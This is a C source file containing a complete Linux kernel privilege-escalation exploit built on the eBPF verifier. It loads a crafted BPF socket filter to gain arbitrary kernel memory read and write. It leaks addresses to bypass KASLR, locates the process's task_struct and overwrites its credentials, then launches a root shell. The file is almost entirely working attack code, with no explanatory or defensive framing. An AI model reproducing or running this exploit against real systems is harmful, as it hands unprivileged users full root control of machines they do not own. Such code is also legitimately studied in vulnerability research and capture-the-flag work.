#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <errno.h>
#include <stdarg.h>
#include <unistd.h>
#include "linux/bpf.h"
#include "bpf_insn.h"

int ctrlmapfd, expmapfd;
int progfd;
int sockets[2];
uint64_t map_ops_leak, bpf_array_addr;
uint64_t kaslr, init_task, init_cred;
uint64_t curr_task, curr_real_cred, curr_cred;
#define TASK_STRUCT_OFFSET_TASKS 0x408
#define TASK_STRUCT_OFFSET_PID 0x510
#define TASK_STRUCT_OFFSET_REAL_CRED 0x6d0
#define TASK_STRUCT_OFFSET_CRED 0x6d8
#define BPF_ARRAY_OFFSET_VALUE 0x110
#define BPF_ARRAY_OFFSET_LEAK 0xc0
#define EXP_MAP_VALUESIZE 0x1000
#define CTRL_MAP_VALUESIZE 0x100
#define LOG_BUF_SIZE 65535
#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))
char bpf_log_buf[LOG_BUF_SIZE];

#define BPF_GET_MAP(fd, idx) \ 
        BPF_LD_MAP_FD(BPF_REG_1, fd), \ 
        BPF_MOV64_IMM(BPF_REG_2, idx), \ 
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_2, -4),  \ 
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), \ 
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), \ 
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \ 
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), \ 
        BPF_EXIT_INSN()

void fail(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    fprintf(stdout, "[!] ");
    vfprintf(stdout, fmt, args);
    va_end(args);
    exit(-1);
}
void x64dump(char *buf, uint32_t num) {
    uint64_t *buf64 = (uint64_t *)buf;
    printf("[-x64dump-] start : \n");
    for (int i = 0; i < num; i++) {
        if (i % 2 == 0 && i != 0) {
            printf("\n");
        }
        printf("0x%016lx ", *(buf64 + i));
    }
    printf("\n[-x64dump-] end ... \n");
}
void loglx(char *tag, uint64_t num) {
    printf("[lx] ");
    printf(" %-20s ", tag);
    printf(": %-#16lx\n", num);
}

static int bpf_prog_load(enum bpf_prog_type prog_type,
                         const struct bpf_insn *insns, int prog_len,
                         const char *license, int kern_version);
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
                          int max_entries);
static int bpf_update_elem(int fd, void *key, void *value, uint64_t flags);
static int bpf_lookup_elem(int fd, void *key, void *value);
static void writemsg(void);
static void __exit(char *err);
static size_t read64(size_t addr);
static void write64(size_t dst_addr, size_t data);
static int find_current_task_struct();

struct bpf_insn insns[] = {
    BPF_GET_MAP(3, 0),
    BPF_MOV64_REG(9, 0),
    BPF_ALU64_IMM(BPF_MOV, 0, 0),

    // r1:4 arg1 r2:0 arg2 lookup_elem(4,0) r0=> map2[0]
    BPF_GET_MAP(4, 0),

    // bpf_reg_state:7 0
    BPF_MOV64_REG(7, 0),
    BPF_ALU64_IMM(BPF_MOV, 0, 0),

    BPF_MOV64_REG(6, 7),
    BPF_MOV64_REG(2, 7),
    BPF_ALU64_IMM(BPF_XOR, 2, 0),
    BPF_ALU64_IMM(BPF_XOR, 6, 1),
    BPF_ALU64_REG(BPF_XOR, 6, 2),
    BPF_ALU64_IMM(BPF_XOR, 6, 0),

    BPF_LDX_MEM(BPF_DW, 5, 9, 0x8),
    // write?
    BPF_JMP_IMM(BPF_JEQ, 5, 0x1, 13),
    // read?
    BPF_JMP_IMM(BPF_JEQ, 5, 0x2, 19),
    BPF_MOV64_REG(3, 7),
    BPF_ALU64_IMM(BPF_XOR, 3, 0),
    BPF_ALU64_IMM(BPF_SUB, 3, BPF_ARRAY_OFFSET_VALUE),
    BPF_ALU64_REG(BPF_XOR, 7, 3),
    BPF_ALU64_REG(BPF_XOR, 7, 2),
    // leak?
    BPF_JMP_IMM(BPF_JEQ, 5, 0x0, 1),
    BPF_EXIT_INSN(),

    // leak array_map_ops and bpf_array+0xc0
    BPF_LDX_MEM(BPF_DW, 8, 7, 0),
    BPF_STX_MEM(BPF_DW, 9, 8, 0x10),
    BPF_LDX_MEM(BPF_DW, 8, 7, BPF_ARRAY_OFFSET_LEAK),
    BPF_STX_MEM(BPF_DW, 9, 8, 0x18),
    BPF_EXIT_INSN(),

    // for arbitrarily write
    BPF_LDX_MEM(BPF_DW, 8, 9, 0x10),
    BPF_ALU64_REG(BPF_MUL, 8, 6),
    BPF_ALU64_REG(BPF_XOR, 7, 8),
    BPF_ALU64_REG(BPF_XOR, 7, 2),
    BPF_LDX_MEM(BPF_DW, 8, 9, 0x18),
    BPF_STX_MEM(BPF_DW, 7, 8, 0),
    BPF_EXIT_INSN(),

    // for arbitrarily read
    BPF_LDX_MEM(BPF_DW, 8, 9, 0x10),
    BPF_ALU64_REG(BPF_MUL, 8, 6),
    BPF_ALU64_REG(BPF_XOR, 7, 8),
    BPF_ALU64_REG(BPF_XOR, 7, 2),
    BPF_LDX_MEM(BPF_DW, 8, 7, 0),
    BPF_STX_MEM(BPF_DW, 9, 8, 0x18),
    BPF_EXIT_INSN(),
};

void prep() {
    ctrlmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), CTRL_MAP_VALUESIZE, 0x1);
    if (ctrlmapfd < 0) { __exit(strerror(errno)); }
    expmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), EXP_MAP_VALUESIZE, 0x2);
    if (expmapfd < 0) { __exit(strerror(errno)); }
    printf("ctrlmapfd: %d,  expmapfd: %d \n", ctrlmapfd, expmapfd);

    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
                           insns, sizeof(insns), "GPL", 0);
    if (progfd < 0) {
        if (errno == EACCES) {
            printf("log:\n%s", bpf_log_buf);
        }
        printf("%s\n", bpf_log_buf);
        __exit(strerror(errno));
    }
    // printf("%s\n", bpf_log_buf);
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) {
        __exit(strerror(errno));
    }
    if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0) {
        __exit(strerror(errno));
    }
}

static int find_current_task_struct() {
    int32_t pid;
    long tasks_offset = TASK_STRUCT_OFFSET_TASKS;
    long pid_offset = TASK_STRUCT_OFFSET_PID;
    curr_task = init_task;
    while (pid != getpid()) {
        curr_task = read64(curr_task + tasks_offset) - tasks_offset;
        pid = (int32_t)(read64(curr_task + pid_offset));
    }
    printf("find current pid(%d) task_struct(%lx)\n", pid, curr_task);
    return 0;
}

void write_cred() {
    write64(curr_task + TASK_STRUCT_OFFSET_REAL_CRED, init_cred);
    write64(curr_task + TASK_STRUCT_OFFSET_CRED, init_cred);
    if (getuid() == 0) {
        printf("getting shell\n");
        system("/bin/sh");
    }
    return;
}

void pwn() {
    printf("pwning...\n");
    uint32_t key = 0x0;
    char *ctrlbuf = malloc(CTRL_MAP_VALUESIZE);
    char *expmapbuf = malloc(EXP_MAP_VALUESIZE);
    uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf;
    memset(ctrlbuf, 0, CTRL_MAP_VALUESIZE);
    memset(expmapbuf, 2, EXP_MAP_VALUESIZE);
    ctrlbuf64[0] = 0x2;
    ctrlbuf64[1] = 0x0;
    bpf_update_elem(ctrlmapfd, &key, ctrlbuf, 0);
    bpf_update_elem(expmapfd, &key, expmapbuf, 0);
    writemsg();
    // leak
    memset(ctrlbuf, 0, CTRL_MAP_VALUESIZE);
    bpf_lookup_elem(ctrlmapfd, &key, ctrlbuf);
    x64dump(ctrlbuf, 8);
    map_ops_leak = ctrlbuf64[2];
    bpf_array_addr = ctrlbuf64[3] - BPF_ARRAY_OFFSET_LEAK;
    kaslr = map_ops_leak - 0xffffffff82019380;
    init_task = kaslr + 0xffffffff82414940;
    init_cred = kaslr + 0xffffffff8244d340;
    loglx("map_ops_leak", map_ops_leak);
    loglx("bpf_array_addr", bpf_array_addr);
    loglx("kaslr", kaslr);
    loglx("init_task", init_task);
    loglx("init_cred", init_cred);
    getchar();
    find_current_task_struct();
    // getchar();
    write_cred();
    free(ctrlbuf);
    free(expmapbuf);
    return;
}
void pwn2() {
    uint32_t key = 0x0;
    char *ctrlbuf = malloc(CTRL_MAP_VALUESIZE);
    char *expmapbuf = malloc(EXP_MAP_VALUESIZE);
    uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf;
    memset(ctrlbuf, 0, CTRL_MAP_VALUESIZE);
    memset(expmapbuf, 2, EXP_MAP_VALUESIZE);
    ctrlbuf64[0] = 0x2;
    ctrlbuf64[1] = 0x0;
    bpf_update_elem(ctrlmapfd, &key, ctrlbuf, 0);
    bpf_update_elem(expmapfd, &key, expmapbuf, 0);
    writemsg();
    // leak
    memset(ctrlbuf, 0, CTRL_MAP_VALUESIZE);
    bpf_lookup_elem(ctrlmapfd, &key, ctrlbuf);
    x64dump(ctrlbuf, 8);
    map_ops_leak = ctrlbuf64[2];
    bpf_array_addr = ctrlbuf64[3] - BPF_ARRAY_OFFSET_LEAK;
    long start_addr = bpf_array_addr & 0xffffffffff000000;
    long end_addr = start_addr + 0x1000000000;
    char target[8];
    long result;
    strcpy(target, "fxxy242");
    prctl(PR_SET_NAME, target);
    for (size_t addr = start_addr; addr < end_addr; addr += 0x1) {
        result = read64(addr);
        if (strcmp((char *)&result, target) == 0) {
            printf("[+] Find task_struct comm : %lx, %s\n", addr, (char *)&result);
            curr_cred = read64(addr - 0x10);
            curr_real_cred = read64(addr - 0x18);
            if ((curr_cred || 0xff00000000000000) && (curr_cred == curr_real_cred)) {
                printf("[+] found real_cred 0x%lx\n", curr_real_cred);
                break;
            }
        }
    }
    if (curr_cred && curr_real_cred) {
        long data = read64(curr_real_cred);
        write64(curr_real_cred + 4, data & 0xffffffff00000000);
        write64(curr_real_cred + 8, 0);
        write64(curr_real_cred + 16, 0);
    }
    if (getuid() == 0) {
        printf("getting shell\n");
        system("/bin/sh");
    }
    return;
}

int main(int argc, char **argv) {
    prep();
    pwn2();
    return 0;
}

static size_t read64(size_t addr) {
    char *ctrlbuf = malloc(CTRL_MAP_VALUESIZE);
    uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf;
    memset(ctrlbuf, 0, CTRL_MAP_VALUESIZE);
    uint32_t key = 0;
    ctrlbuf64[0] = 2;
    ctrlbuf64[1] = 0x2;
    ctrlbuf64[2] = addr;
    bpf_update_elem(ctrlmapfd, &key, ctrlbuf, 0);
    writemsg();
    memset(ctrlbuf, 0, CTRL_MAP_VALUESIZE);
    bpf_lookup_elem(ctrlmapfd, &key, ctrlbuf);
    long result = ctrlbuf64[3];
    free(ctrlbuf);
    return result;
}

static void write64(size_t dst_addr, size_t data) {
    char *ctrlbuf = malloc(CTRL_MAP_VALUESIZE);
    uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf;
    memset(ctrlbuf, 0, CTRL_MAP_VALUESIZE);
    uint32_t key = 0;
    ctrlbuf64[0] = 2;
    ctrlbuf64[1] = 0x1;
    ctrlbuf64[2] = dst_addr;
    ctrlbuf64[3] = data;
    bpf_update_elem(ctrlmapfd, &key, ctrlbuf, 0);
    writemsg();
    free(ctrlbuf);
    return;
}

static void __exit(char *err) {
    fprintf(stderr, "error: %s\n", err);
    exit(-1);
}
static void writemsg(void) {
    char buffer[64];
    ssize_t n = write(sockets[0], buffer, sizeof(buffer));
}

static int bpf_prog_load(enum bpf_prog_type prog_type,
                         const struct bpf_insn *insns, int prog_len,
                         const char *license, int kern_version) {
    union bpf_attr attr = {
        .prog_type = prog_type,
        .insns = (uint64_t)insns,
        .insn_cnt = prog_len / sizeof(struct bpf_insn),
        .license = (uint64_t)license,
        .log_buf = (uint64_t)bpf_log_buf,
        .log_size = LOG_BUF_SIZE,
        .log_level = 1,
    };
    attr.kern_version = kern_version;
    bpf_log_buf[0] = 0;
    return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
                          int max_entries) {
    union bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries};
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}
static int bpf_update_elem(int fd, void *key, void *value, uint64_t flags) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = flags,
    };
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}
static int bpf_lookup_elem(int fd, void *key, void *value) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
    };
    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}
